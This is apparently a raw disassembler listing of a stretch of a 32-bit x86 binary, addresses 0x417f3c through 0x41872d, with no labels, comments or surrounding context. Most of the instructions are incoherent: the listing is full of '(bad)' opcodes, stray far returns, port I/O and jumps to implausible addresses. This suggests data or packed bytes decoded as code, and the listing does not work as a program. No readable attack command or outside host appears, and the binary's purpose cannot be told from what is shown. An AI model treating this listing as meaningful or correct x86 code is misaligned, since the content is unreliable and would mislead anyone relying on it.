  417f3c:	gs inc ebp
  417f3e:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  417f44:	push   ss
  417f45:	xor    ecx,DWORD PTR [ebp+0x3]
  417f48:	sub    edx,DWORD PTR [ecx-0x76]
  417f4b:	dec    ebp
  417f4c:	add    DWORD PTR [ebx+0x88d845],ecx
  417f52:	mov    esi,DWORD PTR [ebx]
  417f54:	or     BYTE PTR [ebx],al
  417f56:	cmp    edx,DWORD PTR [ecx-0x38]
  417f59:	dec    ebp
  417f5a:	out    dx,eax
  417f5b:	xor    eax,DWORD PTR [ebp+0x3]
  417f5e:	mov    edx,DWORD PTR [ecx-0x28]
  417f61:	dec    ebp
  417f62:	add    BYTE PTR [ebx],dh
  417f64:	push   0x518003
  417f69:	push   eax
  417f6a:	add    BYTE PTR [ebx-0x300748b],cl
  417f70:	sbb    BYTE PTR [ebp+0x45],cl
  417f73:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  417f79:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  417f7f:	dec    ebp
  417f80:	inc    ebp
  417f81:	xor    ecx,eax
  417f83:	add    ecx,eax
  417f85:	push   ecx
  417f86:	(bad)  
  417f87:	dec    ebp
  417f88:	mov    al,ds:0xc5e03dff
  417f8d:	retf   
  417f8e:	(bad)  
  417f8f:	into   
  417f90:	sub    bh,bh
  417f92:	dec    esp
  417f93:	adc    al,0x9c
  417f95:	inc    ebp
  417f96:	push   ebp
  417f97:	test   DWORD PTR [edi],ecx
  417f99:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab8ff80]
  417fa0:	jmp    0xc9ba8eb4
  417fa5:	add    cl,dl
  417fa7:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  417fb1:	xor    ecx,DWORD PTR [ebp+0x728b089c]
  417fb7:	rol    BYTE PTR [eax],0x55
  417fba:	clc    
  417fbb:	fs jb  0x417fc5
  417fbe:	mov    eax,DWORD PTR [ebp-0x30]
  417fc1:	xor    al,0x40
  417fc3:	sub    al,0xc7
  417fc5:	mov    ah,ch
  417fc7:	add    DWORD PTR [ebp+0x4534f845],eax
  417fcd:	sub    al,0x86
  417fcf:	mov    BYTE PTR [edx+eax*1-0x335a39],bl
  417fd6:	mov    ch,0xff
  417fd8:	clc    
  417fd9:	add    DWORD PTR [ebp+0x60],0x3d
  417fdd:	call   FWORD PTR [eax+eax*1-0x1f7a77]
  417fe4:	inc    ebp
  417fe5:	dec    DWORD PTR [ebx-0x341ff701]
  417feb:	test   esi,ecx
  417fed:	dec    DWORD PTR [ebx-0x7f8a3301]
  417ff3:	push   eax
  417ff4:	add    DWORD PTR [ebp+0x0],eax
  417ff7:	dec    ebx
  417ff9:	or     al,0xce
  417ffb:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  418002:	into   
  418003:	add    BYTE PTR [ebx-0x34ff1400],cl
  418009:	mov    esi,ecx
  41800b:	sar    bh,0x45
  41800e:	adc    al,0x8b
  418010:	clc    
  418011:	fadd   DWORD PTR [ebp+0x0]
  418014:	mov    ebp,DWORD PTR [edx+0x8]
  418017:	push   edi
  418018:	adc    BYTE PTR [eax+0x1],0x83
  41801c:	add    al,al
  41801e:	retf   
  41801f:	mov    ecx,esi
  418021:	cld    
  418022:	mov    eax,DWORD PTR [eax+0xcb01cc]
  418028:	into   
  418029:	add    BYTE PTR [ebx+0x756aec00],cl
  41802f:	jne    0x418064
  418031:	inc    DWORD PTR [ebx]
  418033:	rcl    BYTE PTR [ecx+0x50],1
  418036:	push   eax
  418037:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  41803d:	mov    eax,DWORD PTR [eax+eiz*8-0x14ffbafd]
  418044:	sar    bh,0x84
  418047:	or     BYTE PTR [ebx],al
  418049:	push   eax
  41804a:	add    BYTE PTR [ebx+0x4532c845],cl
  418050:	pushf  
  418051:	xor    edi,eax
  418053:	pushf  
  418054:	mov    ah,0x89
  418056:	test   eax,ebp
  418058:	clc    
  418059:	inc    ebp
  41805a:	inc    ebp
  41805b:	mov    DWORD PTR [eax+eax*8],esi
  41805e:	sub    al,0x30
  418060:	mov    BYTE PTR [ebx+ecx*4+0x55d8ec89],bl
  418067:	dec    ebp
  418068:	xor    eax,DWORD PTR fs:[edi+0x3]
  41806c:	mov    ecx,DWORD PTR [ecx+0x4d55f4b4]
  418072:	xor    eax,DWORD PTR fs:[edi+0x3]
  418076:	or     DWORD PTR [ecx+0x45ff085c],0x0
  41807d:	shl    DWORD PTR [ebp-0x380064],1
  418083:	int3   
  418084:	lea    eax,[ebp+0x45fff860]
  41808a:	push   eax
  41808b:	xor    dh,BYTE PTR [ebp-0x64]
  41808e:	(bad)  
  41808f:	(bad)  
  418090:	pop    esp
  418091:	lods   al,BYTE PTR ds:[esi]
  418092:	inc    DWORD PTR [ebp+0x4508f8ff]
  418098:	mov    edi,DWORD PTR [eax+edx*8]
  41809b:	pushf  
  41809c:	jo     0x418065
  41809e:	cmp    DWORD PTR [eax-0x7a87af0],0x46
  4180a5:	inc    ebp
  4180a6:	add    BYTE PTR [esi],bh
  4180a8:	push   0x8b809c
  4180ad:	in     al,dx
  4180ae:	inc    ebp
  4180af:	push   ebp
  4180b0:	mov    esi,DWORD PTR [ebx]
  4180b2:	cld    
  4180b3:	add    eax,DWORD PTR [eax+0xf013b]
  4180b9:	adc    al,0x0
  4180bb:	add    bh,bh
  4180bd:	jmp    0xbe81da
  4180c2:	add    BYTE PTR [ebp+0x45],cl
  4180c5:	mov    ecx,DWORD PTR [ebx+0xd1d8e8]
  4180cb:	dec    ebp
  4180cc:	push   0x38033
  4180d1:	cmp    eax,DWORD PTR [eax]
  4180d3:	unpcklps xmm7,xmm0
  4180d6:	jne    0x4180d8
  4180d8:	dec    DWORD PTR [ebx+0x5545cc18]
  4180de:	mov    DWORD PTR [ebx],esi
  4180e0:	shl    BYTE PTR [ebx],1
  4180e2:	inc    ebp
  4180e3:	add    ecx,DWORD PTR [ecx+0x60fc803]
  4180e9:	retf   0x5575
  4180ec:	dec    DWORD PTR [ebx-0x5ba17e8]
  4180f2:	(bad)  
  4180f3:	stc    
  4180f4:	in     al,dx
  4180f5:	or     al,0x85
  4180f7:	dec    ebp
  4180f8:	clc    
  4180f9:	xor    eax,DWORD PTR [ebp+0x3]
  4180fc:	mov    ebp,ecx
  4180fe:	rol    BYTE PTR [eax],1
  418100:	inc    ebp
  418101:	add    BYTE PTR [eax-0x7747ab3],bh
  418107:	clc    
  418108:	inc    ebp
  418109:	retf   
  41810a:	mov    edx,ebx
  41810c:	in     al,dx
  41810d:	(bad)  
  41810e:	retf   
  41810f:	into   
  418110:	into   
  418111:	scas   eax,DWORD PTR es:[edi]
  418112:	dec    ebp
  418113:	mov    ecx,DWORD PTR [ebx-0x3482130c]
  418119:	sub    ecx,esi
  41811b:	cmp    ecx,DWORD PTR [ebp+0x77]
  41811e:	(bad)  
  41811f:	mov    edi,eax
  418121:	int3   
  418122:	test   DWORD PTR [ecx-0x74baff08],ecx
  418128:	xor    ebp,DWORD PTR [esp+ebx*4-0x57cc38ab]
  41812f:	xor    eax,DWORD PTR [ebp+0x4503f803]
  418135:	(bad)  
  418137:	retf   0x559c
  41813a:	(bad)  
  41813b:	mov    esp,DWORD PTR [eax+ebp*8-0x607057b]
  418142:	inc    ebp
  418143:	add    eax,0xeb9c4d3f
  418148:	(bad)  
  418149:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  41814f:	xor    ecx,DWORD PTR [ebp+0x33]
  418152:	mov    eax,DWORD PTR [ebx]
  418154:	call   0xce514c5c
  418159:	retf   0x55d1
  41815c:	test   BYTE PTR [ebx-0x5ff17fe],cl
  418162:	jmp    0x41815d
  418164:	add    BYTE PTR ds:0xebf44d8b,al
  41816a:	push   ebp
  41816b:	mov    ebp,DWORD PTR [ebx]
  41816d:	mov    eax,0x33f8558b
  418172:	retf   
  418173:	xor    ecx,esi
  418175:	add    edx,ecx
  418177:	add    eax,DWORD PTR [edx+0xca010f]
  41817d:	push   ebp
  41817e:	dec    ebp
  41817f:	mov    ecx,DWORD PTR [ebx-0x34050718]
  418185:	stc    
  418186:	rol    DWORD PTR ds:0xebce4dd6,cl
  41818c:	scas   eax,DWORD PTR es:[edi]
  41818d:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  418193:	xor    ebp,DWORD PTR [ebx]
  418195:	xor    edi,DWORD PTR [ebx]
  418197:	add    esi,DWORD PTR [edi+0x3]
  41819a:	mov    ecx,DWORD PTR [edi]
  41819c:	clc    
  41819d:	retf   0x55cb
  4181a0:	into   
  4181a1:	mov    edi,DWORD PTR [eax+ebp*8-0x6740600]
  4181a8:	test   al,0x4d
  4181aa:	push   ebp
  4181ab:	jbe    0x4181e0
  4181ad:	mov    esi,DWORD PTR [ebx]
  4181af:	mov    al,0x3
  4181b1:	push   ebp
  4181b2:	add    esi,DWORD PTR [ebx]
  4181b4:	rdpmc  
  4181b6:	retf   0x5503
  4181b9:	add    ecx,DWORD PTR [ebx-0x53517f1]
  4181bf:	dec    ebp
  4181c0:	stc    
  4181c1:	mov    ecx,DWORD PTR [eax]
  4181c3:	or     BYTE PTR [ebp+0x4d],cl
  4181c6:	jmp    0x1358256
  4181cb:	dec    ebp
  4181cc:	dec    ebp
  4181cd:	(bad)  
  4181ce:	mov    ebx,esp
  4181d0:	clc    
  4181d1:	test   ebx,ecx
  4181d3:	clc    
  4181d4:	ror    DWORD PTR [ebp-0x2a],cl
  4181d7:	mov    esi,ecx
  4181d9:	lock scas eax,DWORD PTR es:[edi]
  4181db:	inc    ebp
  4181dc:	mov    esi,DWORD PTR [ebx]
  4181de:	hlt    
  4181df:	pushf  
  4181e0:	jge    0x41816d
  4181e2:	sub    ebx,esp
  4181e4:	cmp    ecx,ebx
  4181e6:	ja     0x4181b6
  4181e8:	mov    ebp,DWORD PTR [eax-0x58]
  4181eb:	dec    ebp
  4181ec:	xor    ecx,DWORD PTR [di+0x3]
  4181f0:	mov    esp,esp
  4181f2:	clc    
  4181f3:	push   ebp
  4181f4:	retf   
  4181f5:	mov    dl,bl
  4181f7:	adc    esi,edx
  4181f9:	jb     0x4181c9
  4181fb:	add    BYTE PTR [edi-0xb7474b3],ch
  418201:	lock jge 0x4181cf
  418204:	sub    ecx,DWORD PTR [ebp+0x3b]
  418207:	mov    esi,DWORD PTR [edi-0x20]
  41820a:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459c]
  418211:	mov    BYTE PTR [ebx-0x34b20729],cl
  418217:	mov    edx,ebx
  418219:	lock (bad) 
  41821b:	ror    esi,cl
  41821d:	push   ebp
  41821e:	scas   eax,DWORD PTR es:[edi]
  41821f:	mov    ecx,DWORD PTR [ebx+0x7d8cf4e0]
  418225:	pushf  
  418226:	sub    esi,DWORD PTR [edx]
  418228:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  41822e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41822f:	xor    esp,DWORD PTR [ebx]
  418231:	add    ecx,DWORD PTR [ebp-0x1c]
  418234:	mov    edi,DWORD PTR [ebp-0x8]
  418237:	mov    bl,cl
  418239:	cmp    dl,bl
  41823b:	jb     0x41820b
  41823d:	add    dh,dl
  41823f:	dec    ebp
  418240:	scas   eax,DWORD PTR es:[edi]
  418241:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  418247:	shr    DWORD PTR [ebx],cl
  418249:	into   
  41824a:	cmp    edx,esi
  41824c:	mov    ebp,DWORD PTR [edi-0x1bfcfc48]
  418252:	dec    ebp
  418253:	dec    ebp
  418254:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  41825a:	retf   
  41825b:	xor    edx,esi
  41825d:	add    ecx,esi
  41825f:	imul   ecx,edx
  418262:	mov    DWORD PTR [ebp+0x8],edx
  418265:	xor    ecx,DWORD PTR [ebp+0x2b]
  418268:	mov    DWORD PTR [ebx+0x7d4df0ec],ecx
  41826e:	add    esi,DWORD PTR [ebx]
  418270:	rol    BYTE PTR [ebx],0x45
  418273:	rdtsc  
  418275:	xlat   BYTE PTR ds:[ebx]
  418276:	pushf  
  418277:	jge    0x418202
  418279:	xor    esp,eax
  41827b:	sub    eax,DWORD PTR [ebp-0x73]
  41827e:	(bad)  
  41827f:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  418286:	dec    ebp
  418287:	xchg   BYTE PTR [ebx],dh
  418289:	inc    DWORD PTR [ebx]
  41828b:	(bad)  
  41828c:	jmp    0x4182db
  41828e:	mov    ecx,DWORD PTR [ebx-0x34341324]
  418294:	dec    ebp
  418295:	into   
  418296:	mov    ebp,DWORD PTR [edi-0x23737420]
  41829c:	pushf  
  41829d:	shl    DWORD PTR [edx],cl
  41829f:	retf   0x5588
  4182a2:	or     ecx,DWORD PTR [ebp+0x7233114d]
  4182a8:	add    eax,DWORD PTR [eax]
  4182aa:	in     al,0x4d
  4182ac:	push   ebp
  4182ad:	mov    ecx,DWORD PTR [edx+0x72cb11d8]
  4182b3:	fs add ch,cl
  4182b6:	dec    ebp
  4182b7:	sub    ecx,DWORD PTR [edx+0x55e80b03]
  4182bd:	dec    ebp
  4182be:	xor    ecx,DWORD PTR [ebx-0x341b0bfd]
  4182c4:	jge    0x418294
  4182c6:	mov    BYTE PTR [edi+0xf723b3a],ch
  4182cc:	add    cl,dh
  4182ce:	dec    ebp
  4182cf:	dec    DWORD PTR [ebx-0x2c032301]
  4182d5:	inc    ebp
  4182d6:	push   ebp
  4182d7:	dec    DWORD PTR [ebx-0x73ff1f34]
  4182dd:	lea    ebx,[esp+edx*2+0x508bff32]
  4182e4:	mov    ah,0x45
  4182e6:	push   ebp
  4182e7:	mov    esi,DWORD PTR [ebx]
  4182e9:	les    esi,FWORD PTR [ebx]
  4182eb:	add    BYTE PTR [ebx],al
  4182ed:	inc    DWORD PTR [ebx]
  4182ef:	mov    ecx,DWORD PTR [edi]
  4182f1:	cld    
  4182f2:	retf   0x4d80
  4182f5:	add    DWORD PTR [ecx+0x4d30e400],ecx
  4182fb:	jne    0x418288
  4182fd:	(bad)  
  4182fe:	in     al,dx
  4182ff:	ror    bl,1
  418301:	scas   al,BYTE PTR es:[edi]
  418302:	into   
  418303:	add    BYTE PTR [edi-0xf2f7475],ch
  418309:	not    bl
  41830b:	adc    al,0xca
  41830d:	inc    ebp
  41830e:	push   ebp
  41830f:	mov    ecx,DWORD PTR [ebx-0x2cff1b28]
  418315:	push   0xaf80d6
  41831a:	mov    eax,DWORD PTR [eax]
  41831c:	fdiv   st(7),st
  41831e:	sti    
  41831f:	sbb    dh,cl
  418321:	pop    esi
  418322:	xchg   esp,eax
  418323:	leave  
  418324:	pushf  
  418325:	add    al,0x32
  418327:	push   ebp
  418328:	cmp    ebp,esp
  41832a:	sqrtps xmm3,XMMWORD PTR [esi+0x45]
  41832e:	dec    DWORD PTR [ecx-0x740f0375]
  418334:	push   ebp
  418335:	cld    
  418336:	xor    ecx,DWORD PTR [edi-0x76f07efd]
  41833c:	retf   0x558b
  41833f:	clc    
  418340:	xor    esi,eax
  418342:	add    esi,DWORD PTR [ebp-0x75]
  418345:	(bad)  
  418346:	hlt    
  418347:	or     cl,BYTE PTR [esi+eax*8-0x39cdf764]
  41834e:	mov    DWORD PTR [edx],ecx
  418350:	hlt    
  418351:	(bad)  
  418352:	dec    ebp
  418353:	add    dh,BYTE PTR [ebx]
  418355:	leave  
  418356:	mov    edx,0xffec8d55
  41835b:	push   ecx
  41835c:	rol    DWORD PTR [ebp+0x55],1
  41835f:	mov    DWORD PTR [ebx+0x7d55d8fc],ecx
  418365:	mov    eax,0xf8030b33
  41836a:	lar    ecx,di
  41836d:	push   ebp
  41836e:	retf   0x863b
  418371:	jne    0x418370
  418373:	mov    edi,edi
  418375:	or     BYTE PTR [ebp+0x41],dh
  418378:	mov    ebp,esp
  41837a:	cld    
  41837b:	inc    eax
  41837c:	mov    al,0x25
  41837e:	add    DWORD PTR [ecx+0x0],eax
  418381:	in     eax,dx
  418382:	test   DWORD PTR [ecx-0x1],eax
  418385:	fdiv   st(7),st
  418387:	ret    0x8b
  41838a:	cld    
  41838b:	mov    eax,DWORD PTR [eax+0x8d0151]
  418391:	clc    
  418392:	xor    BYTE PTR [ebp+0x45],al
  418395:	mov    ecx,DWORD PTR [ebx+0x8fc0fc]
  41839b:	loopne 0x41839c
  41839d:	mov    edi,edi
  41839f:	mov    ecx,eax
  4183a1:	clc    
  4183a2:	jne    0x418374
  4183a4:	call   0x8294ad
  4183a9:	and    eax,0xc6854575
  4183ae:	je     0x4183b1
  4183b0:	mov    eax,esi
  4183b2:	cld    
  4183b3:	or     DWORD PTR [eax+0x401c9],eax
  4183b9:	push   ebp
  4183ba:	add    ah,ch
  4183bc:	add    BYTE PTR [ecx+0x6a],dl
  4183bf:	inc    ebp
  4183c0:	push   esi
  4183c1:	mov    DWORD PTR [eax-0x4],edx
  4183c4:	pop    edi
  4183c5:	mov    ebx,DWORD PTR [ebx-0x4]
  4183c8:	ret    0xbe
  4183cb:	push   es
  4183cc:	mov    ecx,DWORD PTR [ecx-0x77274af]
  4183d2:	clc    
  4183d3:	lock inc ebp
  4183d5:	jne    0x41842d
  4183d7:	(bad)  
  4183d8:	jne    0x4183de
  4183da:	mov    eax,0xf841ba66
  4183df:	fadd   QWORD PTR [esi]
  4183e1:	(bad)  
  4183e2:	jne    0x418421
  4183e4:	cmp    eax,ebx
  4183e6:	pop    esi
  4183e7:	mov    ecx,DWORD PTR [eax]
  4183e9:	push   ecx
  4183ea:	inc    ecx
  4183eb:	lea    esi,[eax-0x8]
  4183ee:	inc    edx
  4183ef:	inc    ebp
  4183f0:	int    0x8b
  4183f2:	inc    edx
  4183f3:	cld    
  4183f4:	jo     0x4183b5
  4183f6:	inc    ecx
  4183f7:	xchg   edx,esp
  4183f9:	mov    ebx,eax
  4183fb:	mov    ecx,DWORD PTR [ebx-0x722fae08]
  418401:	or     edi,eax
  418403:	inc    ebp
  418404:	inc    ebp
  418405:	(bad)  
  418406:	mov    ecx,DWORD PTR [eax]
  418408:	cld    
  418409:	(bad)  
  41840a:	jmp    0x41840d
  41840c:	mov    eax,esi
  41840e:	mov    DWORD PTR ds:0x4f8c98b,eax
  418414:	rcl    BYTE PTR [esi+0xf],1
  418417:	iret   
  418418:	inc    ebp
  418419:	leave  
  41841a:	(bad)  
  41841b:	dec    DWORD PTR [ecx]
  41841d:	mov    eax,esi
  41841f:	mov    eax,DWORD PTR [edi]
  418421:	mov    dh,0xdd
  418424:	push   es
  418425:	nop
  418426:	(bad)  
  418427:	inc    DWORD PTR [ebx]
  418429:	push   esi
  41842a:	leave  
  41842b:	iret   
  41842c:	add    al,0x46
  41842e:	push   ebp
  41842f:	jmp    0xff92da20
  418434:	inc    ebp
  418435:	push   esi
  418436:	mov    DWORD PTR [esi-0x4],eax
  418439:	in     eax,dx
  41843a:	push   ebp
  41843b:	sbb    BYTE PTR [eax+0x7c6daff],bh
  418441:	add    al,BYTE PTR [edx]
  418443:	mov    edx,DWORD PTR [ebp-0x17]
  418446:	cmp    edi,esi
  418448:	jne    0x418449
  41844a:	(bad)  
  41844b:	push   esi
  41844c:	pop    es
  41844d:	push   ebp
  41844e:	mov    ebp,esp
  418450:	or     BYTE PTR [ebp+0x41],al
  418453:	add    edi,esp
  418455:	sub    BYTE PTR [eax-0x4],al
  418458:	int3   
  418459:	jne    0x41841d
  41845b:	add    DWORD PTR [eax],eax
  41845d:	sbb    al,0x8b
  41845f:	mov    edx,DWORD PTR [ecx+0x14]
  418462:	lea    edx,[edx-0x1ba7508]
  418468:	push   esi
  418469:	enter  0xd375,0xb8
  41846d:	test   DWORD PTR [esi],0x6ce0750
  418473:	enter  0xd375,0x3b
  418477:	neg    DWORD PTR [esi+0x50]
  41847a:	or     cl,dl
  41847c:	inc    edx
  41847d:	(bad)  
  41847e:	loope  0x41846c
  418480:	(bad)  
  418481:	sub    eax,DWORD PTR [ebx]
  418483:	inc    eax
  418484:	loope  0x4184d6
  418486:	add    dl,BYTE PTR [eax-0x37]
  418489:	push   edi
  41848a:	push   ebp
  41848b:	imul   ah
  41848d:	adc    DWORD PTR [ecx-0x1],0x45
  418491:	add    BYTE PTR [ecx+0x55d3fc00],cl
  418497:	lea    edi,[eax-0x7fff4ca]
  41849d:	mov    eax,0x4550402
  4184a2:	cmp    ebp,ecx
  4184a4:	jne    0x418451
  4184a6:	mov    eax,DWORD PTR ds:0x241e808
  4184ac:	in     eax,dx
  4184ad:	add    BYTE PTR [eax-0x7],al
  4184b0:	out    0x36,eax
  4184b2:	inc    ecx
  4184b3:	aas    
  4184b4:	jmp    0xcd4736
  4184b9:	lock mov edi,DWORD PTR [ebp-0x18]
  4184bd:	and    edi,edi
  4184bf:	mov    edi,edi
  4184c1:	call   0xe40f859d
  4184c6:	push   es
  4184c7:	add    al,ch
  4184c9:	ud0    edx,DWORD PTR [ebp-0x7574ff01]
  4184d0:	(bad)  
  4184d1:	hlt    
  4184d2:	add    eax,0xffd3e87d
  4184d7:	cmp    bh,0x8
  4184da:	(bad)  
  4184db:	fld    DWORD PTR [esi]
  4184dd:	out    dx,al
  4184de:	call   0xffa083e6
  4184e3:	cmp    al,0x46
  4184e5:	shl    edx,0x8
  4184e8:	(bad)  
  4184e9:	pop    es
  4184ea:	fisttp QWORD PTR [ebp+0xe577eff]
  4184f0:	push   ebx
  4184f1:	add    BYTE PTR [ebx+0x24008b56],cl
  4184f7:	add    BYTE PTR [ebp+0x50],al
  4184fa:	push   eax
  4184fb:	add    DWORD PTR [ebx+0x757d1834],ecx
  418501:	sub    edx,DWORD PTR [esi-0x24]
  418504:	jne    0x4184bc
  418506:	lods   eax,DWORD PTR ds:[esi]
  418507:	mov    edx,DWORD PTR [edx-0x34]
  41850a:	dec    esi
  41850b:	out    0x83,eax
  41850d:	into   
  41850e:	push   edi
  418510:	loopne 0x4184e0
  418512:	shr    BYTE PTR [edx+ecx*4+0x0],1
  418516:	xor    DWORD PTR [eax-0x741fff01],0xffffffd0
  41851d:	rol    DWORD PTR [edx],0x8
  418520:	mov    esp,ecx
  418522:	cmp    DWORD PTR [ebx],0xc
  418525:	mov    esi,0x5001c0
  41852a:	push   eax
  41852b:	push   cs
  41852c:	push   eax
  41852d:	(bad)  
  41852e:	sub    edx,edi
  418530:	push   esi
  418531:	adc    al,0xcb
  418533:	ins    DWORD PTR es:[edi],dx
  418534:	mov    eax,0x203e8
  418539:	add    al,ah
  41853b:	inc    esi
  41853c:	mov    al,ch
  41853e:	pop    es
  41853f:	add    DWORD PTR [eax],0x1
  418542:	add    dh,al
  418544:	add    ah,ch
  418546:	rol    DWORD PTR [edx-0xd],1
  418549:	cli    
  41854a:	push   0x4a
  41854c:	pop    ecx
  41854d:	retf   0xfe6
  418550:	add    BYTE PTR [ebx-0x4e72f41e],al
  418556:	(bad)  
  418557:	dec    BYTE PTR [ebx+0x45b1fc72]
  41855d:	(bad)  
  41855e:	sub    ebp,DWORD PTR [ebx]
  418560:	and    al,0x52
  418562:	(bad)  
  418563:	dec    edi
  418564:	inc    ebp
  418565:	shl    DWORD PTR [eax+0x24fe8c8],0x0
  41856c:	add    BYTE PTR [ebp-0x7b],dh
  41856f:	pop    eax
  418570:	add    BYTE PTR [edx+0x0],bl
  418573:	pop    edx
  418574:	dec    ebp
  418575:	jmp    DWORD PTR [ebx]
  418577:	and    al,0xec
  418579:	push   edx
  41857a:	out    0x64,eax
  41857c:	jmp    0xd3f37b81
  418581:	jmp    0x4185db
  418583:	mov    al,0xfe
  418585:	dec    BYTE PTR [ebp-0x18fd8018]
  41858b:	add    BYTE PTR [esi+ebp*1],bh
  41858e:	pop    edx
  41858f:	icebp  
  418590:	mov    eax,cs
  418592:	ins    BYTE PTR es:[edi],dx
  418593:	adc    eax,0x75510000
  418598:	mov    esi,0x70158
  41859d:	or     DWORD PTR [eax-0x74f48dfe],esi
  4185a3:	mov    edi,esp
  4185a5:	cld    
  4185a6:	jge    0x41861d
  4185a8:	(bad)  
  4185aa:	aas    
  4185ab:	and    al,0x6d
  4185ad:	adc    cl,0x1
  4185b0:	mov    eax,DWORD PTR [eax]
  4185b2:	and    ecx,DWORD PTR [ebx-0x167203fd]
  4185b8:	dec    ebp
  4185b9:	add    eax,ebp
  4185bb:	add    BYTE PTR [edx],al
  4185bd:	fadd   DWORD PTR [eax]
  4185bf:	stc    
  4185c0:	enter  0xee00,0x8b
  4185c4:	sbb    eax,0x1
  4185c7:	sbb    esi,ecx
  4185c9:	in     al,0x0
  4185cb:	in     eax,dx
  4185cc:	add    BYTE PTR [eax],al
  4185ce:	jne    0x41855b
  4185d0:	cmp    edx,esp
  4185d2:	jb     0x4185dd
  4185d4:	jmp    0x41864b
  4185d6:	mov    ecx,DWORD PTR [ebx+0x4d91d4cc]
  4185dc:	add    BYTE PTR [ebx+0x4d83d840],cl
  4185e2:	add    DWORD PTR [ebx+0x4d3bdcee],ecx
  4185e8:	jb     0x418573
  4185ea:	pop    edx
  4185eb:	fadd   QWORD PTR [ebx-0x7445faa1]
  4185f1:	or     dh,BYTE PTR [edx+0x0]
  4185f4:	inc    edx
  4185f5:	or     dl,bh
  4185f7:	xlat   BYTE PTR ds:[ebx]
  4185f8:	dec    edx
  4185f9:	push   edi
  4185fa:	add    al,0x7
  4185fc:	leave  
  4185fd:	rol    DWORD PTR [edx+eax*1],0x7
  418601:	add    ecx,ecx
  418603:	mov    edx,ecx
  418605:	int3   
  418606:	jmp    0x4185c6
  418608:	mov    al,0x0
  41860a:	(bad)  
  41860b:	jne    0x4185f5
  41860d:	mov    eax,DWORD PTR [edx]
  41860f:	call   0xc1560314
  418614:	pop    edi
  418615:	add    ebx,DWORD PTR [ecx-0x37]
  418618:	pop    ecx
  418619:	or     BYTE PTR [ecx*4-0x1445b8af],dh
  418620:	push   es
  418621:	mov    eax,DWORD PTR [eax]
  418623:	int3   
  418624:	add    ch,al
  418626:	jae    0x418610
  418628:	int    0x1
  41862a:	enter  0x3000,0x18
  41862e:	add    BYTE PTR [ebp+0x75],al
  418631:	mov    esi,DWORD PTR [eax-0x171f0134]
  418637:	push   0x2
  418639:	pop    ecx
  41863a:	add    BYTE PTR [eax],cl
  41863c:	push   ebx
  41863d:	lea    edi,[edi+eax*2]
  418640:	mov    al,0x1
  418642:	jb     0x418644
  418644:	mov    al,0x10
  418646:	push   eax
  418647:	add    al,0x75
  418649:	add    BYTE PTR [ebx],ch
  41864b:	add    ebx,esp
  41864d:	int3   
  41864e:	jne    0x418660
  418650:	movsx  edx,cl
  418653:	add    DWORD PTR [eax],eax
  418655:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  41865c:	mov    gs,edi
  41865e:	add    BYTE PTR [eax-0x50],ch
  418661:	add    al,ch
  418663:	mov    eax,DWORD PTR [ecx]
  418665:	sub    eax,DWORD PTR [eax]
  418667:	jb     0x4186de
  418669:	add    DWORD PTR [esp+eiz*8-0x50],esi
  41866d:	jge    0x418657
  41866f:	add    al,0x1
  418671:	add    DWORD PTR [eax],0x0
  418674:	jne    0x418676
  418676:	je     0x4186bd
  418678:	mov    eax,DWORD PTR [edi]
  41867a:	ror    BYTE PTR [ebp+0x4d],1
  41867d:	or     DWORD PTR [ecx+0x4d03d004],0x3
  418684:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  41868a:	mov    DWORD PTR [ebx],ebp
  41868c:	fadd   DWORD PTR [eax+0x75]
  41868f:	inc    eax
  418690:	pop    eax
  418691:	lea    ebx,[ecx+0x4f]
  418694:	push   0xb1000003
  418699:	out    dx,eax
  41869a:	add    ebp,DWORD PTR [edx+edx*2]
  41869d:	add    BYTE PTR [ebx+ecx*4],bh
  4186a0:	mov    ch,BYTE PTR [ebx]
  4186a2:	jb     0x418716
  4186a4:	add    al,0x89
  4186a6:	push   eax
  4186a7:	call   0x8429d419
  4186ac:	add    DWORD PTR [eax+eax*1],eax
  4186af:	jae    0x4186c5
  4186b1:	icebp  
  4186b2:	inc    ebp
  4186b3:	mov    eax,DWORD PTR gs:[ecx]
  4186b6:	int3   
  4186b7:	out    dx,al
  4186b8:	loopne 0x418707
  4186ba:	sub    eax,DWORD PTR [edx]
  4186bc:	push   0xffffff83
  4186be:	pop    esi
  4186bf:	push   cs
  4186c0:	jl     0x4186db
  4186c2:	add    al,0xaf
  4186c4:	xor    eax,0x832b6d00
  4186c9:	mov    eax,DWORD PTR [edx]
  4186cb:	rcr    BYTE PTR [ebp+0x754500dc],cl
  4186d1:	ror    DWORD PTR [ebx+0x7dc8e803],1
  4186d7:	inc    ebp
  4186d8:	shr    ebx,0x3
  4186db:	or     DWORD PTR [eax],0x4
  4186de:	push   0xffffffa5
  4186e0:	pop    esi
  4186e1:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  4186e8:	jmp    0x418747
  4186ea:	mov    edi,0xff0272
  4186ef:	fdivr  QWORD PTR [ebp+0x5d]
  4186f2:	push   0x4e
  4186f4:	pop    ecx
  4186f5:	call   0x41cafa
  4186fa:	mov    DWORD PTR [ebx],eax
  4186fc:	in     al,0xc8
  4186fe:	rol    BYTE PTR [ebp-0x75],0xc1
  418702:	call   0xab88e3
  418707:	pop    esi
  418708:	enter  0xceff,0x8b
  41870c:	repz mov ecx,DWORD PTR [ebp-0x34]
  418710:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  418717:	je     0x418719
  418719:	or     DWORD PTR [ebx-0x74183b24],eax
  41871f:	jne    0x418705
  418721:	jmp    0x41871c
  418723:	push   DWORD PTR [edx-0x24]
  418726:	push   0x4d
  418728:	pop    ecx
  418729:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  41872d:	jge    0x418735
